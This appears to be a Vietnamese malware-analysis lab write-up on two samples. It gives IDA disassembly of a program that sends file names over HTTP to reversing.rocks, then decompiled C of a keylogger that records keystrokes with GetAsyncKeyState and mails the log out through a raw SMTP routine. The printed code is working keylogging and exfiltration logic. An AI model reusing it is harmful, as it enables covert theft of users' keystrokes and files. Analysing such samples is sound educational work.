@@ -1,0 +1,678 @@
+# **Lab_01-1.malware**
+1. 
+a)
+![[Pasted image 20260919160816.png]]
+`0x004011a0`
+b)
+```asm-ida
+.text:004011A0 ; int __cdecl main(int argc, const char **argv, const char **envp)
+.text:004011A0 _main           proc near               ; CODE XREF: ___tmainCRTStartup+F8↓p
+.text:004011A0 
+.text:004011A0 argc            = dword ptr  4
+.text:004011A0 argv            = dword ptr  8
+.text:004011A0 envp            = dword ptr  0Ch
+.text:004011A0 
+.text:004011A0                 push    0               ; dwReserved
+.text:004011A2                 push    1               ; dwFlags
+.text:004011A4                 push    offset szUrl    ; "http://reversing.rocks/"
+.text:004011A9                 call    ds:InternetCheckConnectionA ; WININET
+.text:004011AF                 test    eax, eax
+.text:004011B1                 jz      short loc_4011C0
+.text:004011B3                 call    sub_401130
+.text:004011B8                 push    0               ; Code
+.text:004011BA                 call    ds:exit         ; MSVCR120
+.text:004011C0 ; -----------------------------------------------------
+.text:004011C0 
+.text:004011C0 loc_4011C0:                             ; CODE XREF: _main+11↑j
+.text:004011C0                 push    1               ; Code
+.text:004011C2                 call    ds:exit         ; MSVCR120
+.text:004011C2 _main           endp
+```
+*Các cấu trúc được sử dụng:* Cấu trúc rẽ nhánh ở `0x004011B1`
+*Chuỗi thú vị:* `http://reversing.rocks/`, vì ở đây có API `InternetCheckConnectionA` thuộc `WinINet.dll`, URL trên có liên quan đến việc malware kết nối mạng.
+
+2. 
+```asm-ida
+.text:00401130 sub_401130      proc near               ; CODE XREF: _main+13↓p
+.text:00401130                 push    esi
+.text:00401131                 push    edi
+.text:00401132                 push    0               ; dwFlags
+.text:00401134                 push    0               ; lpszProxyBypass
+.text:00401136                 push    0               ; lpszProxy
+.text:00401138                 push    0               ; dwAccessType
+.text:0040113A                 push    offset szAgent  ; "ntoskrnl"
+.text:0040113F                 call    ds:InternetOpenA ; WININET
+.text:00401145                 mov     edi, eax
+.text:00401147                 test    edi, edi
+.text:00401149                 jnz     short loc_401153
+.text:0040114B                 push    1               ; Code
+.text:0040114D                 call    ds:exit         ; MSVCR120
+.text:00401153 ; ---------------------------------------------------------------------------
+.text:00401153 
+.text:00401153 loc_401153:                             ; CODE XREF: sub_401130+19↑j
+.text:00401153                 push    0               ; dwContext
+.text:00401155                 push    0               ; dwFlags
+.text:00401157                 push    3               ; dwService
+.text:00401159                 push    0               ; lpszPassword
+.text:0040115B                 push    0               ; lpszUserName
+.text:0040115D                 push    4D2h            ; nServerPort
+.text:00401162                 push    offset szServerName ; "reversing.rocks"
+.text:00401167                 push    edi             ; hInternet
+.text:00401168                 call    ds:InternetConnectA ; WININET
+.text:0040116E                 mov     esi, eax
+.text:00401170                 test    esi, esi
+.text:00401172                 jnz     short loc_401183
+.text:00401174                 push    edi             ; hInternet
+.text:00401175                 call    ds:InternetCloseHandle ; WININET
+.text:0040117B                 push    1               ; Code
+.text:0040117D                 call    ds:exit         ; MSVCR120
+.text:00401183 ; ---------------------------------------------------------------------------
+.text:00401183 
+.text:00401183 loc_401183:                             ; CODE XREF: sub_401130+42↑j
+.text:00401183                 mov     ecx, esi        ; hConnect
+.text:00401185                 call    sub_401000
+.text:0040118A                 push    esi             ; hInternet
+.text:0040118B                 mov     esi, ds:InternetCloseHandle ; WININET
+.text:00401191                 call    esi ; InternetCloseHandle ; WININET
+.text:00401193                 push    edi             ; hInternet
+.text:00401194                 call    esi ; InternetCloseHandle ; WININET
+.text:00401196                 pop     edi
+.text:00401197                 xor     eax, eax
+.text:00401199                 pop     esi
+.text:0040119A                 retn
+.text:0040119A sub_401130      endp
+```
+a) *Các tham số của InternetConnectA có nghĩa là gì*
+`IntrernetConnectA` là `stdcall`, các tham số lần lượt được push vào stack từ phải sang trái. Cấu trúc của gọi API này là:
+```cpp
+HINTERNET InternetConnectA( 
+		HINTERNET hInternet, 
+		LPCSTR lpszServerName, 
+		INTERNET_PORT nServerPort, 
+		LPCSTR lpszUserName, 
+		LPCSTR lpszPassword, 
+		DWORD dwService, 
+		DWORD dwFlags, 
+		DWORD_PTR dwContext 
+		);
+```
+Vậy nên các tham số lần lượt là:
+- `dwContext = 0`: giá trị context do chương trình tự định nghĩa, thường dùng để gắn thông tin với handle khi xử lý callback bất đồng bộ. `0` nghĩa là không dùng context đặc biệt.
+- `dwFlags = 0`: các cờ tùy chọn cho kết nối. `0` nghĩa là không bật flag đặc biệt nào.
+- `dwService = 3`: xác định loại dịch vụ muốn sử dụng. Giá trị `3` là `INTERNET_SERVICE_HTTP` tức chương trình đang tạo kết nối HTTP.
+- `lpszPassword = 0`: không cung cấp password khi tạo kết nối.
+- `lpszUsername = 0`: không cung cấp username khi tạo kết nối.
+- `nServerPort = 0x4d2`: port của server.
+- `lpszServerName = "reversing.rocks": tên server mà chương trình muốn kết nối.
+- `hInternet`: handle của WinINet session đã được tạo trước đó, thường đến từ 'OpenInternetA'.
+Vậy, API này thiết lập 1 kết nối http đến server `reversing.rocks`, port 1234.
+
+b) *Code này làm gì*
+Đầu tiên, nó khởi tạo 1 WinINet session bằng `OpenInternetA`, nếu thành công thì thực thi tiếp, không thì thoát chương trình.
+Tiếp theo, nó thực hiện tạo kết nối http đến `reversing.rock`, nếu lỗi thì đống handle, rồi thoát.
+Cuối cùng, nó gọi hàm `sub_401000`, có vẻ là hàm gửi dữ liệu, rồi đóng kết nối.
+
+3. 
+```asm-ida
+.text:00401000 ; Attributes: bp-based frame fuzzy-sp
+.text:00401000 
+.text:00401000 ; int __thiscall sub_401000(HINTERNET hConnect)
+.text:00401000 sub_401000      proc near               ; CODE XREF: sub_401130+55↓p
+.text:00401000 
+.text:00401000 dwNumberOfBytesWritten= dword ptr -144h
+.text:00401000 FindFileData    = _WIN32_FIND_DATAA ptr -140h
+.text:00401000 
+.text:00401000                 push    ebp
+.text:00401001                 mov     ebp, esp
+.text:00401003                 and     esp, 0FFFFFFF8h
+.text:00401006                 sub     esp, 144h
+.text:0040100C                 push    ebx
+.text:0040100D                 push    esi
+.text:0040100E                 push    edi
+.text:0040100F                 lea     eax, [esp+150h+FindFileData]
+.text:00401013                 mov     esi, ecx
+.text:00401015                 push    eax             ; lpFindFileData
+.text:00401016                 push    offset FileName ; "\\*"
+.text:0040101B                 call    ds:FindFirstFileA ; KERNEL32
+.text:00401021                 mov     edi, eax
+.text:00401023                 mov     [esp+150h+dwNumberOfBytesWritten], 0
+.text:0040102B                 test    edi, edi
+.text:0040102D                 jz      loc_401118
+.text:00401033                 push    0               ; dwContext
+.text:00401035                 push    80000000h       ; dwFlags
+.text:0040103A                 push    offset lpszAcceptTypes ; lplpszAcceptTypes
+.text:0040103F                 push    0               ; lpszReferrer
+.text:00401041                 push    0               ; lpszVersion
+.text:00401043                 push    offset szObjectName ; "/"
+.text:00401048                 push    offset szVerb   ; "POST"
+.text:0040104D                 push    esi             ; hConnect
+.text:0040104E                 call    ds:HttpOpenRequestA ; WININET
+.text:00401054                 push    0               ; dwContext
+.text:00401056                 push    0               ; dwFlags
+.text:00401058                 push    0               ; lpBuffersOut
+.text:0040105A                 mov     esi, eax
+.text:0040105C                 push    0               ; lpBuffersIn
+.text:0040105E                 push    esi             ; hRequest
+.text:0040105F                 call    ds:HttpSendRequestExA ; WININET
+.text:00401065                 lea     ecx, [esp+150h+FindFileData.cFileName]
+.text:00401069                 lea     edx, [ecx+1]
+.text:0040106C                 lea     esp, [esp+0]
+.text:00401070 
+.text:00401070 loc_401070:                             ; CODE XREF: sub_401000+75↓j
+.text:00401070                 mov     al, [ecx]
+.text:00401072                 inc     ecx
+.text:00401073                 test    al, al
+.text:00401075                 jnz     short loc_401070
+.text:00401077                 mov     ebx, ds:InternetWriteFile ; WININET
+.text:0040107D                 lea     eax, [esp+150h+dwNumberOfBytesWritten]
+.text:00401081                 push    eax             ; lpdwNumberOfBytesWritten
+.text:00401082                 sub     ecx, edx
+.text:00401084                 lea     eax, [esp+154h+FindFileData.cFileName]
+.text:00401088                 push    ecx             ; dwNumberOfBytesToWrite
+.text:00401089                 push    eax             ; lpBuffer
+.text:0040108A                 push    esi             ; hFile
+.text:0040108B                 call    ebx ; InternetWriteFile ; WININET
+.text:0040108D                 lea     eax, [esp+150h+dwNumberOfBytesWritten]
+.text:00401091                 push    eax             ; lpdwNumberOfBytesWritten
+.text:00401092                 push    1               ; dwNumberOfBytesToWrite
+.text:00401094                 push    offset asc_402108 ; "\n"
+.text:00401099                 push    esi             ; hFile
+.text:0040109A                 call    ebx ; InternetWriteFile ; WININET
+.text:0040109C                 lea     eax, [esp+150h+FindFileData]
+.text:004010A0                 push    eax             ; lpFindFileData
+.text:004010A1                 push    edi             ; hFindFile
+.text:004010A2                 call    ds:FindNextFileA ; KERNEL32
+.text:004010A8                 test    eax, eax
+.text:004010AA                 jle     short loc_4010F6
+.text:004010AC                 lea     esp, [esp+0]
+.text:004010B0 
+.text:004010B0 loc_4010B0:                             ; CODE XREF: sub_401000+F4↓j
+.text:004010B0                 lea     eax, [esp+150h+FindFileData.cFileName]
+.text:004010B4                 mov     [esp+150h+dwNumberOfBytesWritten], 0
+.text:004010BC                 lea     edx, [eax+1]
+.text:004010BF                 nop
+.text:004010C0 
+.text:004010C0 loc_4010C0:                             ; CODE XREF: sub_401000+C5↓j
+.text:004010C0                 mov     cl, [eax]
+.text:004010C2                 inc     eax
+.text:004010C3                 test    cl, cl
+.text:004010C5                 jnz     short loc_4010C0
+.text:004010C7                 lea     ecx, [esp+150h+dwNumberOfBytesWritten]
+.text:004010CB                 sub     eax, edx
+.text:004010CD                 push    ecx             ; lpdwNumberOfBytesWritten
+.text:004010CE                 push    eax             ; dwNumberOfBytesToWrite
+.text:004010CF                 lea     eax, [esp+158h+FindFileData.cFileName]
+.text:004010D3                 push    eax             ; lpBuffer
+.text:004010D4                 push    esi             ; hFile
+.text:004010D5                 call    ebx ; InternetWriteFile ; WININET
+.text:004010D7                 lea     eax, [esp+150h+dwNumberOfBytesWritten]
+.text:004010DB                 push    eax             ; lpdwNumberOfBytesWritten
+.text:004010DC                 push    1               ; dwNumberOfBytesToWrite
+.text:004010DE                 push    offset asc_402108 ; "\n"
+.text:004010E3                 push    esi             ; hFile
+.text:004010E4                 call    ebx ; InternetWriteFile ; WININET
+.text:004010E6                 lea     eax, [esp+150h+FindFileData]
+.text:004010EA                 push    eax             ; lpFindFileData
+.text:004010EB                 push    edi             ; hFindFile
+.text:004010EC                 call    ds:FindNextFileA ; KERNEL32
+.text:004010F2                 test    eax, eax
+.text:004010F4                 jg      short loc_4010B0
+.text:004010F6 
+.text:004010F6 loc_4010F6:                             ; CODE XREF: sub_401000+AA↑j
+.text:004010F6                 push    0               ; dwContext
+.text:004010F8                 push    0               ; dwFlags
+.text:004010FA                 push    0               ; lpBuffersOut
+.text:004010FC                 push    esi             ; hRequest
+.text:004010FD                 call    ds:HttpEndRequestA ; WININET
+.text:00401103                 push    esi             ; hInternet
+.text:00401104                 call    ds:InternetCloseHandle ; WININET
+.text:0040110A                 push    edi             ; hFindFile
+.text:0040110B                 call    ds:FindClose    ; KERNEL32
+.text:00401111                 pop     edi
+.text:00401112                 pop     esi
+.text:00401113                 pop     ebx
+.text:00401114                 mov     esp, ebp
+.text:00401116                 pop     ebp
+.text:00401117                 retn
+.text:00401118 ; ---------------------------------------------------------------------------
+.text:00401118 
+.text:00401118 loc_401118:                             ; CODE XREF: sub_401000+2D↑j
+.text:00401118                 push    1               ; Code
+.text:0040111A                 call    ds:exit         ; MSVCR120
+.text:0040111A sub_401000      endp
+.text:0040111A 
+.text:0040111A ; ---------------------------------------------------------------------------
+.text:00401120                 db 10h dup(0CCh)
+```
+a)
+Hàm này sử dụng 2 cấu trúc:
+- ==Cấu trúc rẽ nhánh:== `0x40102d`, `0x4010aa`, ``
+- ==Cấu trúc lặp:== `0x4010c5`, `0x4010f4`
+b)
+Các API được gọi:
+- `FindFirstFileA`: thuộc `KERNEL32.DLL`, tìm 1 tập tin hay thư mục trong 1 đường dẫn cụ thể
+- `HttpOpenRequestA`: Tạo 1 thông điệp Http Request.
+- `HttpSendRequestEx`: Gửi thông điệp Request.
+- `InternetWriteFile`: Gửi dữ liệu.
+- `FindNextFileA`: Sử dụng handle có được từ `FindFirstFileA` để tìm các tập tin hoặc đường dẫn tiếp theo.
+- `HttpEndRequestA`: Kết thúc request.
+- `InternetCloseHandle`: Đóng session handle.
+- `FindClose`: đóng handle của `FindFirstFile`.
+![[Pasted image 20260919204939.png]]
+![[Pasted image 20260919204956.png]]
+![[Pasted image 20260919205024.png]]
+c) 
+Hàm này đang thực hiện hành vi: yêu cầu kết nối và gửi dữ liệu lên server.
+
+4. 
+Malware thực hiện tìm kiếm các file dữ liệu trên máy nạn nhân, rồi gửi chúng lên server.
+
+# **Lab-02-2.malware**
+1. 
+```asm-ida
+.text:00401290 ; Attributes: bp-based frame fuzzy-sp
+.text:00401290 
+.text:00401290 ; int __cdecl main(int argc, const char **argv, const char **envp)
+.text:00401290                 public _main
+.text:00401290 _main           proc near               ; CODE XREF: ___mingw_CRTStartup+E2↑p
+.text:00401290 
+.text:00401290 lpClassName     = dword ptr -18h
+.text:00401290 lpWindowName    = dword ptr -14h
+.text:00401290 var_10          = dword ptr -10h
+.text:00401290 Time            = dword ptr -0Ch
+.text:00401290 Stream          = dword ptr -8
+.text:00401290 hWnd            = dword ptr -4
+.text:00401290 argc            = dword ptr  8
+.text:00401290 argv            = dword ptr  0Ch
+.text:00401290 envp            = dword ptr  10h
+.text:00401290 
+.text:00401290                 push    ebp
+.text:00401291                 mov     ebp, esp
+.text:00401293                 sub     esp, 18h
+.text:00401296                 and     esp, 0FFFFFFF0h
+.text:00401299                 mov     eax, 0
+.text:0040129E                 add     eax, 0Fh
+.text:004012A1                 add     eax, 0Fh
+.text:004012A4                 shr     eax, 4
+.text:004012A7                 shl     eax, 4
+.text:004012AA                 mov     [ebp+var_10], eax
+.text:004012AD                 mov     eax, [ebp+var_10]
+.text:004012B0                 call    ___chkstk
+.text:004012B5                 call    ___main
+.text:004012BA                 call    _AllocConsole@0 ; AllocConsole()
+.text:004012BF                 mov     [esp+18h+lpWindowName], 0 ; lpWindowName
+.text:004012C7                 mov     [esp+18h+lpClassName], offset ClassName ; "ConsoleWindowClass"
+.text:004012CE                 call    _FindWindowA@8  ; FindWindowA(x,x)
+.text:004012D3                 sub     esp, 8
+.text:004012D6                 mov     [ebp+hWnd], eax
+.text:004012D9                 mov     [esp+18h+lpWindowName], 0 ; nCmdShow
+.text:004012E1                 mov     eax, [ebp+hWnd]
+.text:004012E4                 mov     [esp+18h+lpClassName], eax ; hWnd
+.text:004012E7                 call    _ShowWindow@8   ; ShowWindow(x,x)
+.text:004012EC                 sub     esp, 8
+.text:004012EF                 mov     [esp+18h+lpWindowName], offset Mode ; "a+"
+.text:004012F7                 mov     [esp+18h+lpClassName], offset FileName ; "\\WINDOWS\\lzwindowlz.av"
+.text:004012FE                 call    _fopen
+.text:00401303                 mov     [ebp+Stream], eax
+.text:00401306                 mov     [esp+18h+lpClassName], 0 ; Time
+.text:0040130D                 call    _time
+.text:00401312                 mov     [ebp+Time], eax
+.text:00401315                 mov     eax, [ebp+Stream]
+.text:00401318                 mov     [esp+18h+lpWindowName], eax ; Stream
+.text:0040131C                 mov     [esp+18h+lpClassName], offset Buffer ; "\nstarted logging: "
+.text:00401323                 call    _fputs
+.text:00401328                 lea     eax, [ebp+Time]
+.text:0040132B                 mov     [esp+18h+lpClassName], eax ; Time
+.text:0040132E                 call    _ctime
+.text:00401333                 mov     edx, eax
+.text:00401335                 mov     eax, [ebp+Stream]
+.text:00401338                 mov     [esp+18h+lpWindowName], eax ; Stream
+.text:0040133C                 mov     [esp+18h+lpClassName], edx ; Buffer
+.text:0040133F                 call    _fputs
+.text:00401344                 mov     eax, [ebp+Stream]
+.text:00401347                 mov     [esp+18h+lpClassName], eax ; Stream
+.text:0040134A                 call    _fclose
+.text:0040134F                 call    __Z8get_keysv   ; get_keys(void)
+.text:00401354                 mov     [ebp+Time], eax
+.text:00401357                 mov     eax, [ebp+Time]
+.text:0040135A                 leave
+.text:0040135B                 retn
+.text:0040135B _main           **endp**
+```
+Các API trong hàm `main`:
+- `AllocConsole`: Tạo 1 console mới cho tiến trình hiện tại, thường dùng bởi các gui app (vì nó không có console).
+- `FindWindowA`: Tìm một cửa sổ đang tồn tại dựa trên tên class hoặc tiêu đề cửa sổ, ở đây là tên class của cửa số.
+- `ShowWindow`: Thay đổi trạng thái hiển thị của 1 cửa sổ (ẩn/hiện/phóng to...), ở đây là ẩn cửa sổ đi.
+- `fopen`: Mở 1 file, mode `a+` là vừa đọc, vừa ghi vào cuối file.
+- `ctime`: lấy thông tin về thời gian của máy.
+- `fputs`: ghi dữ liệu vào 1 stream, ở đây chính là ghi vào file mở bằng `fopen`.
+- `fclose`: đóng stream.
+Chuỗi thú vị: đó là đường dẫn `\\WINDOWS\\lzwindowlz.av` và dòng `\nstarted logging:`, có thể hành vi của chương trình là log lại các sự kiện nào đó và ghi vào file trong đường dẫn.
+
+2. 
+```c
+int get_keys()
+{
+  FILE *Stream; // [esp+20h] [ebp-18h]
+  FILE *Streama; // [esp+20h] [ebp-18h]
+  __int16 i; // [esp+26h] [ebp-12h]
+  int Size; // [esp+2Ch] [ebp-Ch]
+  _BYTE *Buffer; // [esp+30h] [ebp-8h]
+
+  fopen(FileName: "\\WINDOWS\\lzwindowlz.av", Mode: "a+");
+LABEL_2:
+  for ( i = 8; ; ++i )
+  {
+    if ( i > 222 )
+      goto LABEL_44;
+    if ( GetAsyncKeyState(vKey: i) != -32767 )
+      continue;
+    Stream = fopen(FileName: "\\WINDOWS\\lzwindowlz.av", Mode: "a+");
+    if ( Stream == nullptr )
+      break;
+    if ( i > 38 && i <= 64 )
+    {
+      fputc(Character: i, Stream);
+      fclose(Stream);
+LABEL_44:
+      Streama = fopen(FileName: "\\WINDOWS\\lzwindowlz.av", Mode: "rb");
+      fseek(Stream: Streama, Offset: 0, Origin: 2);
+      Size = ftell(Stream: Streama);
+      if ( Size > 99 )
+      {
+        fseek(Stream: Streama, Offset: 0, Origin: 0);
+        Buffer = malloc(Size);
+        Buffer[fread(Buffer, ElementSize: 1u, ElementCount: Size, Stream: Streama)] = 0;
+        MailIt(
+          name: "my.inbox.com",
+          Source: "unknown-g@inbox.com",
+          Str: "unknown-g@hotmail.co.uk",
+          a4: "Logged",
+          a5: Buffer);
+        fclose(Stream: Streama);
+        Streama = fopen(FileName: "\\WINDOWS\\lzwindowlz.av", Mode: "w");
+      }
+      fclose(Stream: Streama);
+      goto LABEL_2;
+    }
+    if ( i > 64 && i <= 90 )
+    {
+      fputc(Character: (__int16)(i + 32), Stream);
+      fclose(Stream);
+      goto LABEL_44;
+    }
+    switch ( i )
+    {
+      case '\b':
+        fputs(Buffer: "\r\n[BACKSPACE]\r\n", Stream);
+        fclose(Stream);
+        break;
+      case '\t':
+        fputs(Buffer: "\r\n[TAB]\r\n", Stream);
+        fclose(Stream);
+        break;
+      case '\r':
+        fputs(Buffer: "\r\n[ENTER]\r\n", Stream);
+        fclose(Stream);
+        break;
+      case '\x10':
+        fputs(Buffer: "\r\n[SHIFT]\r\n", Stream);
+        fclose(Stream);
+        break;
+      case '\x11':
+        fputs(Buffer: "\r\n[CTRL]\r\n", Stream);
+        fclose(Stream);
+        break;
+      case '\x14':
+        fputs(Buffer: "\r\n[CAPS LOCK]\r\n", Stream);
+        fclose(Stream);
+        break;
+      case ' ':
+        fputc(Character: ' ', Stream);
+        fclose(Stream);
+        break;
+      case '`':
+        fputc(Character: '0', Stream);
+        fclose(Stream);
+        break;
+      case 'a':
+        fputc(Character: '1', Stream);
+        fclose(Stream);
+        break;
+      case 'b':
+        fputc(Character: '2', Stream);
+        fclose(Stream);
+        break;
+      case 'c':
+        fputc(Character: '3', Stream);
+        fclose(Stream);
+        break;
+      case 'd':
+        fputc(Character: '4', Stream);
+        fclose(Stream);
+        break;
+      case 'e':
+        fputc(Character: '5', Stream);
+        fclose(Stream);
+        break;
+      case 'f':
+        fputc(Character: '6', Stream);
+        fclose(Stream);
+        break;
+      case 'g':
+        fputc(Character: '7', Stream);
+        fclose(Stream);
+        break;
+      case 'h':
+        fputc(Character: '8', Stream);
+        fclose(Stream);
+        break;
+      case 'i':
+        fputc(Character: '9', Stream);
+        fclose(Stream);
+        break;
+      case '\xBA':
+        fputs(Buffer: "\r\n[;:]\r\n", Stream);
+        fclose(Stream);
+        break;
+      case '\xBB':
+        fputc(Character: '+', Stream);
+        fclose(Stream);
+        break;
+      case '\xBC':
+        fputc(Character: ',', Stream);
+        fclose(Stream);
+        break;
+      case '\xBD':
+        fputc(Character: '-', Stream);
+        fclose(Stream);
+        break;
+      case '\xBE':
+        fputc(Character: '.', Stream);
+        fclose(Stream);
+        break;
+      case '\xBF':
+        fputs(Buffer: "\r\n[/?]\r\n", Stream);
+        fclose(Stream);
+        break;
+      case '\xC0':
+        fputs(Buffer: "\r\n[`~]\r\n", Stream);
+        fclose(Stream);
+        break;
+      case '\xDB':
+        fputs(Buffer: "\r\n[ [{ ]\r\n", Stream);
+        fclose(Stream);
+        break;
+      case '\xDC':
+        fputs(Buffer: "\r\n[\\|]\r\n", Stream);
+        fclose(Stream);
+        break;
+      case '\xDD':
+        fputs(Buffer: "\r\n[ ]} ]\r\n", Stream);
+        fclose(Stream);
+        break;
+      case '\xDE':
+        fputs(Buffer: "\r\n['\"]\r\n", Stream);
+        fclose(Stream);
+        break;
+      default:
+        fclose(Stream);
+        break;
+    }
+  }
+  return 1;
+}
+```
+a)
+API đáng chú ý nhất: `GetaSyncKeyState`: đây là api để kiểm tra trạng thái của 1 phím. Trong code này
+```c
+if (GetAsyncKeyState(i) != -32767)
+    continue;
+
+Stream = fopen("\\WINDOWS\\lzwindolz.av", "a+");
+```
+Nó đang kiểm tra trạng thái của phím có mã ascii là`i`. Logic là:
+```
+nếu phím i chưa vừa được nhấn
+    → continue, quay lại vòng lặp
+
+nếu phím i vừa được nhấn
+    → mở file \WINDOWS\lzwindolz.av bằng mode a+
+```
+Kết hợp với việc nhảy lại `label_22` khi size của file chưa đủ, ta có thể đoán được hàm này thực hiện ghi lại các phím mà người dùng nhập.
+b)
+![[Pasted image 20260919213507.png]]
+Chỉ cần nhìn vào sơ đồ cũng có thể đoán được đây là cấu trúc switch-case.
+
+3. 
+Đây là 1 loại keylogger cơ bản. 1 số bằng chứng:
+- Đầu tiên là đường dẫn `\\WINDOWS\\lzwindowlz.av`, là file dùng để ghi log các phím được nhập.
+- Tiếp đến là API `GetaSyncKeyState` nằm trong hàm `get_keys`, nó có nhiệm vụ kiểm tra trạng thái các phím, từ đó biết được phím nào được nhập.
+- Cuối cùng là hàm `MailIt`
+```c
+int __cdecl MailIt(char *name, char *Source, char *Str, char *a4, char *a5)
+{
+  size_t v5; // eax
+  size_t Count; // eax
+  size_t v7; // eax
+  size_t v8; // eax
+  size_t v9; // eax
+  size_t v10; // eax
+  size_t v11; // eax
+  size_t v12; // eax
+  int v14; // [esp+18h] [ebp-5C0h]
+  char *buf; // [esp+1Ch] [ebp-5BCh]
+  char Destination[1008]; // [esp+20h] [ebp-5B8h] BYREF
+  struct sockaddr v17; // [esp+410h] [ebp-1C8h] BYREF
+  struct hostent *v18; // [esp+420h] [ebp-1B8h]
+  int v19; // [esp+424h] [ebp-1B4h]
+  int v20; // [esp+428h] [ebp-1B0h]
+  FILE *Stream; // [esp+42Ch] [ebp-1ACh]
+  struct WSAData WSAData; // [esp+430h] [ebp-1A8h] BYREF
+  SOCKET s; // [esp+5CCh] [ebp-Ch]
+
+  buf = (char *)malloc(Size: 0x12Du);
+  Stream = fopen(FileName: "\\WINDOWS\\lzwz.av", Mode: "a+");
+  if ( WSAStartup(wVersionRequested: 0x202u, lpWSAData: &WSAData) == -1 )
+  {
+    fputs(Buffer: "WSAStartup failed", Stream);
+    WSACleanup();
+    return -1;
+  }
+  else
+  {
+    v18 = gethostbyname(name);
+    if ( v18 == nullptr )
+    {
+      perror(ErrMsg: "gethostbyname");
+      exit(Code: 1);
+    }
+    memset(a1: &v17, Val: 0, Size: sizeof(v17));
+    memcpy(a1: &v17.sa_data[2], Src: *(const void **)v18->h_addr_list, Size: v18->h_length);
+    v17.sa_family = v18->h_addrtype;
+    *(_WORD *)v17.sa_data = htons(hostshort: 0x19u);
+    s = socket(af: 2, type: 1, protocol: 0);
+    fputs(Buffer: "Connecting....\n", Stream);
+    if ( connect(s, name: &v17, namelen: 16) == -1 )
+    {
+      perror(ErrMsg: "connect");
+      exit(Code: 1);
+    }
+    Sleep(dwMilliseconds: 0x1F4u);
+    v19 = recv(s, buf, len: 300, flags: 0);
+    buf[v19] = 0;
+    fputs(Buffer: buf, Stream);
+    strcpy(Destination, Source: "helo typical-jam2.0catch.com\n");
+    fputs(Buffer: Destination, Stream);
+    v5 = strlen(Str: Destination);
+    v20 = send(s, buf: Destination, len: v5, flags: 0);
+    Sleep(dwMilliseconds: 0x1F4u);
+    v19 = recv(s, buf, len: 300, flags: 0);
+    buf[v19] = 0;
+    fputs(Buffer: buf, Stream);
+    strcpy(Destination, Source: "MAIL FROM:<");
+    Count = strlen(Str);
+    strncat(Destination, Source: Str, Count);
+    strncat(Destination, Source: ">\n", Count: 3u);
+    fputs(Buffer: Destination, Stream);
+    v7 = strlen(Str: Destination);
+    v20 = send(s, buf: Destination, len: v7, flags: 0);
+    Sleep(dwMilliseconds: 0x1F4u);
+    v19 = recv(s, buf, len: 300, flags: 0);
+    buf[v19] = 0;
+    fputs(Buffer: buf, Stream);
+    strcpy(Destination, Source: "RCPT TO:<");
+    v8 = strlen(Str: Source);
+    strncat(Destination, Source, Count: v8);
+    strncat(Destination, Source: ">\n", Count: 3u);
+    fputs(Buffer: Destination, Stream);
+    v9 = strlen(Str: Destination);
+    v20 = send(s, buf: Destination, len: v9, flags: 0);
+    Sleep(dwMilliseconds: 0x1F4u);
+    v19 = recv(s, buf, len: 300, flags: 0);
+    buf[v19] = 0;
+    fputs(Buffer: buf, Stream);
+    strcpy(Destination, Source: "DATA\n");
+    fputs(Buffer: Destination, Stream);
+    v10 = strlen(Str: Destination);
+    v20 = send(s, buf: Destination, len: v10, flags: 0);
+    Sleep(dwMilliseconds: 0x1F4u);
+    v19 = recv(s, buf, len: 300, flags: 0);
+    buf[v19] = 0;
+    fputs(Buffer: buf, Stream);
+    Sleep(dwMilliseconds: 0x1F4u);
+    strcpy(Destination, Source: "To:");
+    strcat(Destination, Source);
+    strcat(Destination, Source: "\n");
+    strcat(Destination, Source: "From:");
+    strcat(Destination, Source: Str);
+    strcat(Destination, Source: "\n");
+    strcat(Destination, Source: "Subject:");
+    strcat(Destination, Source: a4);
+    strcat(Destination, Source: "\n");
+    strcat(Destination, Source: a5);
+    strcat(Destination, Source: "\r\n.\r\n");
+    fputs(Buffer: Destination, Stream);
+    v11 = strlen(Str: Destination);
+    v20 = send(s, buf: Destination, len: v11, flags: 0);
+    Sleep(dwMilliseconds: 0x1F4u);
+    v19 = recv(s, buf, len: 300, flags: 0);
+    buf[v19] = 0;
+    fputs(Buffer: buf, Stream);
+    strcpy(Destination, Source: "quit\n");
+    fputs(Buffer: Destination, Stream);
+    v12 = strlen(Str: Destination);
+    v20 = send(s, buf: Destination, len: v12, flags: 0);
+    Sleep(dwMilliseconds: 0x1F4u);
+    v19 = recv(s, buf, len: 300, flags: 0);
+    buf[v19] = 0;
+    fputs(Buffer: buf, Stream);
+    fclose(Stream);
+    closesocket(s);
+    WSACleanup();
+  }
+  return v14;
+}
+```
+- ngay từ cái tên ta cũng đã biết được nhiệm vụ của nó rồi, sau khi phân tích, thì ta biết được nó dùng giao thức smtp để gửi file log đến mailserver `unknown-g@inbox.bom`
+Có, nó tạo ra 2 file: `\\WINDOWS\\lzwindowlz.av`, ghi log các phím nhập và `\\WINDOWS\\lzwz.av`, nhiệm vụ là nhận vào các chuỗi trả lời của chương trình, cũng với dữ liệu từ server gửi lại, nghĩa là nó cũng có nhiệm vụ là 1 log.
